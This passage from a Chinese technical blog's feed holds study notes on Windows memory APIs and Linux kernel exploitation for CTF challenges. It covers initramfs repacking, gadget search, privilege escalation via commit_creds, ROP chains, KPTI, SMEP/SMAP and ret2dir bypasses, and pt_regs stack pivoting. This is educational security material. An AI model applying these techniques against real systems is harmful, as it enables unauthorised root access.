，则系统会选择一个默认的初始大小。</li><li><code>dwMaximumSize</code>：堆的最大大小（以字节为单位）。如果为 0 ，则堆的大小受系统的限制。</li></ul></li><li>返回值：<ul><li>如果操作成功，返回堆对象的句柄；</li><li>如果操作失败，返回 NULL 。</li></ul></li></ul><h4 id="HeapAlloc-HeapFree"><a href="#HeapAlloc-HeapFree" class="headerlink" title="HeapAlloc&#x2F;HeapFree"></a>HeapAlloc&#x2F;HeapFree</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI LPVOID WINAPI <span class="title function_">HeapAlloc</span> <span class="params">(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)</span>;</span><br></pre></td></tr></table></figure><ul><li>作用：在指定的堆中分配指定大小的内存块。</li><li>参数：<ul><li><code>hHeap</code>：要分配内存的堆的句柄。此句柄通常由HeapCreate函数创建。</li><li><code>dwFlags</code>：内存分配的标志。可以是以下标志的组合：<ul><li><code>HEAP_ZERO_MEMORY</code>：分配的内存块被初始化为零。</li><li><code>HEAP_GENERATE_EXCEPTIONS</code>：在分配内存时发生错误时生成异常。</li><li><code>HEAP_NO_SERIALIZE</code>：禁用堆的同步机制，使多线程访问堆时不同步。</li></ul></li><li><code>dwBytes</code>：要分配的内存块的大小（以字节为单位）。</li></ul></li><li>返回值：<ul><li>如果分配成功，返回指向分配的内存块的指针；</li><li>如果分配失败，返回 NULL 。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI WINBOOL WINAPI <span class="title function_">HeapFree</span><span class="params">(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem)</span></span><br></pre></td></tr></table></figure><ul><li><p>返回值：True&#x2F;False</p></li><li><p>参数：</p><ul><li><code>hHeap</code>：要释放内存的堆的句柄。</li><li><code>dwFlags</code>：释放内存的标志。可以是以下标志的组合：<ul><li><code>HEAP_NO_SERIALIZE</code>：禁用堆的同步机制，使多线程访问堆时不同步。</li></ul></li><li><code>lpMem</code>：要释放的内存块的指针。</li></ul></li></ul><h4 id="VirtualAlloc-VirtualFree"><a href="#VirtualAlloc-VirtualFree" class="headerlink" title="VirtualAlloc &#x2F; VirtualFree"></a><strong>VirtualAlloc &#x2F; VirtualFree</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI LPVOID WINAPI <span class="title function_">VirtualAlloc</span> <span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span>;</span><br></pre></td></tr></table></figure><ul><li><p>作用：为进程保留或提交指定大小的虚拟内存区域。</p></li><li><p>参数：</p><ul><li><code>lpAddress</code>：要保留或提交的虚拟内存区域的首字节地址。可以指定为NULL，表示由系统选择地址。</li><li><code>dwSize</code>：要保留或提交的虚拟内存区域的大小（以字节为单位）。</li><li><code>flAllocationType</code>：内存分配的类型标志。可以是以下标志的组合：<ul><li><code>MEM_COMMIT</code>：提交虚拟内存区域。</li><li><code>MEM_RESERVE</code>：保留虚拟内存区域。</li><li><code>MEM_RESET</code>：将虚拟内存区域的内容重置为零。</li><li><code>MEM_RESET_UNDO</code>：撤消对虚拟内存区域的重置操作。</li></ul></li><li><code>flProtect</code>：内存保护标志，指定分配的内存区域的访问权限和保护级别。</li></ul></li><li><p>返回值：</p><ul><li>如果操作成功，返回分配的虚拟内存区域的首字节地址；</li><li>如果操作失败，返回 NULL 。</li></ul></li><li><p><code>VirtualAlloc</code> 是在比“堆”更低的层面上操作内存。 <strong>堆管理器（Heap Manager）本身就是构建在 <code>VirtualAlloc</code> 之上的</strong> 。当你创建一个堆（<code>HeapCreate</code>）或者堆需要更多内存时，堆管理器会在内部调用 <code>VirtualAlloc</code> 来向操作系统申请大块的虚拟地址空间（保留或提交），然后再将这些大块内存细分，管理后分配给 <code>HeapAlloc</code> 的调用者。</p></li><li><p><strong>关键区别</strong> ：<code>VirtualAlloc</code> 操作的是页（Page，通常是4KB）的整数倍，而 <code>HeapAlloc</code> 可以分配任意字节大小的内存块。</p></li></ul><h4 id="malloc-free"><a href="#malloc-free" class="headerlink" title="malloc &#x2F; free"></a><strong>malloc &#x2F; free</strong></h4><ul><li>这是C语言标准库的函数。</li><li><strong>底层实现</strong> : 在Windows上，<code>malloc</code> 和 <code>free</code> 是由C&#x2F;C++运行时库实现的。它们最终会调用Windows的堆API（如 <code>HeapAlloc</code>&#x2F;<code>HeapFree</code>）来向操作系统申请和释放内存。它们管理的是CRT自己的 <strong>私有堆</strong> 。</li><li><strong>不能混用内存分配函数系列：</strong> 例如，由 <code>malloc</code> 分配的内存必须由 <code>free</code> 释放；由 <code>HeapAlloc</code> 分配的内存必须由 <code>HeapFree</code> 释放；由 <code>new</code> 分配的内存必须由 <code>delete</code> 释放。混用会导致堆损坏，引发程序崩溃或难以调试的错误。</li></ul>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux kernel学习（一）</title>
      <link href="/2025/10/03/2025-10-3-learning_linux_kernel_1/"/>
      <url>/2025/10/03/2025-10-3-learning_linux_kernel_1/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h1><h2 id="一、kernel-pwn学习（一）"><a href="#一、kernel-pwn学习（一）" class="headerlink" title="一、kernel pwn学习（一）"></a>一、kernel pwn学习（一）</h2><h3 id="1、常用指令和脚本"><a href="#1、常用指令和脚本" class="headerlink" title="1、常用指令和脚本"></a>1、常用指令和脚本</h3><h4 id="解压命令"><a href="#解压命令" class="headerlink" title="解压命令"></a>解压命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> core <span class="comment">#创建core文件夹，在其中解压缩和打包</span></span><br><span class="line">file core.cpio <span class="comment">#查看压缩方式</span></span><br><span class="line"><span class="built_in">mv</span> core.cpio ./core/core.cpio.gz <span class="comment"># gunzip只能解压gz后缀的文件</span></span><br><span class="line"><span class="built_in">cd</span> core</span><br><span class="line">gunzip core.cpio.gz <span class="comment"># gzip解压</span></span><br><span class="line">cpio -idmv &lt; core.cpio <span class="comment"># cpio命令从命令行接收core.cpio作为参数来解压</span></span><br><span class="line"><span class="built_in">cp</span> core.ko ../core.ko</span><br><span class="line">trash-put core.cpio <span class="comment"># 不再需要</span></span><br><span class="line">vim init <span class="comment"># 修改init启动脚本，注释掉定时关机命令</span></span><br></pre></td></tr></table></figure><h4 id="打包命令"><a href="#打包命令" class="headerlink" title="打包命令"></a>打包命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o -H newc &gt; ../core.cpio</span><br><span class="line"><span class="comment"># 或者：</span></span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment">#还原</span></span><br><span class="line"><span class="built_in">mv</span> core.cpio ../core.cpio</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><h4 id="gadget-地址查找"><a href="#gadget-地址查找" class="headerlink" title="gadget&#x2F;地址查找"></a>gadget&#x2F;地址查找</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nm ../vmlinux | grep -i <span class="string">&#x27;user_free_payload_rcu&#x27;</span>  <span class="comment">#查找user_free_payload_rcu的地址</span></span><br><span class="line">nm ../vmlinux | grep <span class="string">&#x27; T _stext&#x27;</span> <span class="comment">#查找kernel_base的地址</span></span><br><span class="line"></span><br><span class="line">ropper -f ../vmlinux --search <span class="string">&quot;push rsi;&quot;</span> <span class="comment">#查找gadget</span></span><br></pre></td></tr></table></figure><h4 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp -masm=intel -static</span><br></pre></td></tr></table></figure><h4 id="gdb调试命令"><a href="#gdb调试命令" class="headerlink" title="gdb调试命令"></a>gdb调试命令</h4><p>查看保护信息：</p><ul><li><code>cat /proc/cpuinfo</code></li></ul><p>查找基地址：</p><ul><li><code>cat /proc/modules | grep [驱动名]</code></li><li><code>lsmod</code></li><li><code>cat /sys/module/[驱动名]/sections/.text</code></li></ul><p><code>add-symbol-file [驱动名] [基地址]</code> 加载符号表</p><p>查找函数地址：</p><ul><li><code>cat /proc/kallsyms | grep [函数名]</code></li></ul><p><code>b [function_name] / b entry_SYSCALL_64 if $[寄存器]==[变量]</code> 下断点</p><p>调试脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb -q \</span><br><span class="line">       -ex <span class="string">&quot;target remote:1234&quot;</span> \</span><br><span class="line">       -ex <span class="string">&quot;add-symbol-file ./kgadget.ko 0xffffffffc0002000&quot;</span> \</span><br><span class="line">       -ex <span class="string">&quot;b *0xffffffff81c00010 if \$r15==0xbeefdead&quot;</span></span><br></pre></td></tr></table></figure><h4 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h4><p><code>vmlinux</code> 是静态编译，未经过压缩的 kernel 文件，从中找到一些 gadget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line"><span class="comment"># TODO: find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line"><span class="comment">#       and not just an elf</span></span><br><span class="line">readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line"><span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line"><span class="keyword">for</span>pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line"><span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">check_vmlinux <span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="2、kernel-rop"><a href="#2、kernel-rop" class="headerlink" title="2、kernel rop"></a>2、kernel rop</h3><p>通常情况下kernel pwn一类题需要将可执行文件 <code>exp</code> 上传到远程服务器上并执行，该可执行文件 <code>exp</code> 需要具有提权+get shell两个功能，因为启动内核后的 <code>shell</code> 不具备 <code>root</code> 权限，无法查看非 <code>root</code> 用户才能打开的 <code>flag</code> 文件。因此需要在内核态执行 <code>commit_creds(prepare_kernel_cred(NULL))</code>（高版本为 <code>commit_creds(prepare_kernel_cred(&amp;init_task))</code> 或 <code>commit_creds(&amp;init_cred)</code> ）当前线程的 <code>cred</code> 结构体便变为 init 进程的 <code>cred</code> 的拷贝，也就获得了 <code>root</code> 权限。</p><h4 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h4><ul><li><code>swapgs</code>指令恢复用户态GS寄存器</li><li><code>sysretq</code>或者 <code>iretq</code>恢复到用户空间</li></ul><p><code>iretq</code> 会依次从栈中弹出 <code>RIP</code>、<code>CS</code>、<code>RFLAGS</code> 等信息，从而实现从内核态返回到用户态的跳转。</p><p>ROP链构造：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h4 id="KPTI-bypass（内核页表隔离）"><a href="#KPTI-bypass（内核页表隔离）" class="headerlink" title="KPTI bypass（内核页表隔离）"></a>KPTI bypass（内核页表隔离）</h4><p>KPTI中每个进程有两套页表——内核态页表与用户态页表(两个地址空间)。内核态页表只能在内核态下访问，可以创建到内核和用户的映射（用户空间受SMAP和SMEP保护）。用户态页表只包含用户空间和部分内核地址。KPTI 同时还令内核页表中用户地址空间部分对应的页顶级表项不再拥有执行权限（NX）。</p><p>每个进程都有一套指向进程自身的页表，由CR3寄存器指向。因为内核空间的PGD与用户空间的PGD 两张页全局目录表放在一段连续的内存中，只需将CR3 的第 13 位取反便能完成页表切换的操作。</p><p><img src="/image/learning_linux_kernel_1/1740298529614.png" alt="1740298529614"></p><p>用于完成内核态页表切换回到用户态页表的函数 <code>swapgs_restore_regs_and_return_to_usermode</code>，栈空间布局如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">↓   swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">    0 // padding</span><br><span class="line">    0 // padding</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><p>或者找到类似如下 <code>gadget</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov  rdi, cr3</span><br><span class="line">or rdi, 0x1000</span><br><span class="line">mov  cr3, rdi</span><br></pre></td></tr></table></figure><h4 id="smep-smap-bypass"><a href="#smep-smap-bypass" class="headerlink" title="smep &amp;&amp; smap bypass"></a>smep &amp;&amp; smap bypass</h4><p><strong>SMEP</strong> ：位于Cr4的第20位，作用是让处于内核权限的CPU无法执行用户代码。<br><strong>SMAP</strong> ：位于Cr4的第21位，作用是让处于内核权限的CPU无法读写用户代码。</p><p><img src="/image/learning_linux_kernel_1/1740466406857.png" alt="1740466406857"></p><p>在未开启 <code>smep/smap</code>机制时，<code>cr4</code>的值一般为 <code>0x6f0</code> ，利用 <code>gadget</code>将其修改为此值即可绕过保护</p><h4 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h4><p>在内核中存在一块 <code>direct mapping area</code>（即线性映射区域），它线性映射了整个物理内存空间。也就是说，用户空间内存都可以在此区域上找到，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段（<code>smep/smap/kpti</code>）</p><p><img src="/image/learning_linux_kernel_1/1740317897176.png" alt="1740317897176"></p><p> <code>ret2dir</code> 攻击的手段有如下：</p><ul><li>利用 mmap 在用户空间大量喷射内存</li><li><img src="/image/learning_linux_kernel_1/1740317914274.png" alt="1740317914274"></li><li>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc 获取到的地址），这个地址直接来自于线性映射区</li><li>利用泄露出的内核线性映射区的地址进行内存搜索 ，从而找到我们在用户空间喷射的内存</li></ul><p><img src="/image/learning_linux_kernel_1/1740317331256.png" alt="1740317331256"></p><h4 id="pt-regs结构体"><a href="#pt-regs结构体" class="headerlink" title="pt_regs结构体"></a>pt_regs结构体</h4><p>在进行系统调用时，会完成从用户态到内核态的切换，需要保存用户态时的上下文寄存器，而这些寄存器的值都需要保存在 <code>pt_regs</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以利用如下 <code>exp</code>查看 <code>pt_regs</code> 结构体和设置某些未被题目 <code>ioctl</code>特殊设置的寄存器来实施栈迁移操作。</p><p>调试时可以在 <code>entry_SYSCALL_64</code>函数处下断点，随后通过系统调用表跳转到对应的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">target =  <span class="number">0xffff888000000000</span> + <span class="number">0x6000000</span>;</span><br><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   0x10;&quot;</span> <span class="comment">//ioctl</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   0x1BF52;&quot;</span> <span class="comment">//cmd</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux kernel学习（二）</title>
      <link href="/2025/10/03/2025-10-3-learning_linux_kernel_2/"/>
      <url>/2025/10/03/2025-10-3-learning_linux_kernel_2/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="linux-kernel"><a href="#linux-kernel" class="headerlink" title="linux kernel"></a>linux kernel</h1><h2 id="kernel-pwn学习（二）"><a href="#kernel-pwn学习（二）" class="headerlink" title="kernel pwn学习（二）"></a>kernel pwn学习（二）</h2><h3 id="内核堆管理机制（参考：Kernel-2-内核堆基础与-SLUB-分配器-nebuu-la-）"><a href="#内核堆管理机制（参考：Kernel-2-内核堆基础与-SLUB-分配器-nebuu-la-）" class="headerlink" title="内核堆管理机制（参考：Kernel 2 - 内核堆基础与 SLUB 分配器 (nebuu.la)）"></a>内核堆管理机制（参考：<a href="https://eastxuelian.nebuu.la/kernel/Kernel-How2Kernel-0x02-heap-basics">Kernel 2 - 内核堆基础与 SLUB 分配器 (nebuu.la)</a>）</h3><h4 id="Buddy-System"><a href="#Buddy-System" class="headerlink" title="Buddy System"></a>Buddy System</h4><p>伙伴系统（<code>Buddy System</code>）：区级别的内存管理系统，以 <strong>页</strong> 为粒度进行内存分配，并管理所有物理内存。在内存的分配与释放方面，<code>Buddy System</code> 按照空闲页面的连续大小进行分阶管理，表现为zone结构体中的 <code>free_area</code>：</p><p><img src="/image/learning_linux_kernel_2/1740887994937.png" alt="1740887994937"></p><p>其中每块内存大小为 <code>2^order * page_size</code></p><h4 id="Slab-allocator"><a href="#Slab-allocator" class="headerlink" title="Slab allocator"></a>Slab allocator</h4><p><code>SLAB</code>分配器用于管理从 <code>Buddy System</code> 申请到的内存，分割成多个小的 <code>object</code> 返回给上层调用者。</p><h5 id="slab-结构体"><a href="#slab-结构体" class="headerlink" title="slab 结构体"></a>slab 结构体</h5><ul><li>复用 <code>page</code> 结构体</li><li>作为单份 <code>Object</code> 池</li><li>其中关键成员包括：<ul><li><code>slab_cache</code>：<code>kmem_cache</code> 类型，指向对应的内存池</li><li><code>slab_list</code>：多个相同用途的 <code>slab</code> 组成的双向链表</li><li><code>freelist</code>：指向空闲对象的单向链表，以 <code>NULL</code> 结尾</li></ul></li></ul><p><img src="/image/learning_linux_kernel_2/1740888420250.png" alt="1740888420250"></p><h5 id="kmem-cache-结构体"><a 